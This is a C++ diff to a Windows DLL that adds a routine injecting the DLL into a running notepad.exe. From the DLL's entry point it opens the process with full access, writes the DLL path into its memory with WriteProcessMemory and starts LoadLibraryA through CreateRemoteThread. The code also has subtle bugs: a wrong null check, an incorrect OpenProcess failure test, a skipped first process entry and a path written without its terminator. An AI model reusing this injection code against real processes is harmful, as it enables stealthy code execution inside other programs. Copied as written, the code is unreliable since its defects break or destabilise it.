@@ -5,6 +5,8 @@
 #include <Windows.h>
 #include <winternl.h>
 #include <intrin.h>
+#include <Psapi.h>
+#include <Tlhelp32.h>
 #include <cassert>
 
 #ifdef _WIN64
@@ -28,6 +30,7 @@ typedef unsigned __int64 QWORD;
 #endif
 
 void testShellcodeInLocalProcess();
+void testShellcodeInOtherProcess(PWSTR processName);
 
 BOOL WINAPI EntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
 {
@@ -37,6 +40,8 @@ BOOL WINAPI EntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
         peutils::listTEBLoadedDlls();
 
         testShellcodeInLocalProcess();
+
+        testShellcodeInOtherProcess(L"notepad.exe");
     }
     __except (EXCEPTION_EXECUTE_HANDLER) {
         LOG("SEH exception occurred");
@@ -80,6 +85,25 @@ PSTR getFullDllName() {
 
     return fullDllName;
 }
+
+DWORD getPidByModuleName(PWSTR processName) {
+    if (!processName && !processName[0])
+        return -1;
+    PROCESSENTRY32 pe32 = { 0 };
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+    HANDLE hTool32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    BOOL bProcess = Process32First(hTool32, &pe32);
+    if (bProcess == TRUE) {
+        while ((Process32Next(hTool32, &pe32)) == TRUE) {
+            if (wcscmp(pe32.szExeFile, processName) == 0) {
+                return pe32.th32ProcessID;
+            }
+        }
+    }
+    CloseHandle(hTool32);
+    return -1;
+}
+
 
 void testShellcodeInLocalProcess() {
     PSTR pShellcodeStr = reinterpret_cast<char*>(shLoadLibraryA);
@@ -128,4 +152,55 @@ void testShellcodeInLocalProcess() {
 
         delete[] pMem;
     }
+}
+
+void testShellcodeInOtherProcess(PWSTR processName) {
+    SetLastError(0);
+    ULONG ulLastError = GetLastError();
+
+    DWORD pid = getPidByModuleName(processName);
+    LOG("getPidByModuleName(%S) returned %d", processName, pid);
+    if (pid == -1)
+        return;
+
+    // Get process handle
+    SetLastError(0);
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    LOG("OpenProcess(%d) returned 0x%08x", pid, hProcess);
+    if (hProcess == INVALID_HANDLE_VALUE)
+        return;
+
+    // Allocate memory inside the process
+    PSTR pDllnameStr = getFullDllName();
+    size_t dllnameLen = strlen(pDllnameStr);
+    LOG("Full path to dll is: %s", pDllnameStr);
+    SetLastError(0);
+    LPVOID pDllName = (LPVOID)VirtualAllocEx(hProcess, NULL, dllnameLen, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    ulLastError = GetLastError();
+    LOG("VirtualAllocEx(phandle: 0x%08x, size: %d) returned 0x%08x, GetLastError(): %d", hProcess, dllnameLen, pDllName, ulLastError);
+    if (!pDllName)
+        return;
+
+    // Finding LoadLibraryAddr
+    SetLastError(0);
+    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
+    LOG("GetProcAddress(LoadLibraryA) returned 0x%08x, GetLastError(): %d", pLoadLibrary, ulLastError);
+    if (!pLoadLibrary)
+        return;
+
+    // Write to memory
+    SetLastError(0);
+    BOOL bRes = WriteProcessMemory(hProcess, pDllName, pDllnameStr, dllnameLen, NULL);
+    ulLastError = GetLastError();
+    LOG("WriteProcessMemory(phandle: 0x%08x) returned %d, GetLastError(): %d", hProcess, bRes, ulLastError);
+    if (!bRes)
+        return;
+
+    // Create a thread inside virtual address space of the process
+    SetLastError(0);
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pLoadLibrary, pDllName, NULL, NULL);
+    ulLastError = GetLastError();
+    LOG("CreateRemoteThread(phandle: 0x%08x) returned 0x%08x, GetLastError(): %d", hProcess, hThread, ulLastError);
+
+    CloseHandle(hProcess);
 }
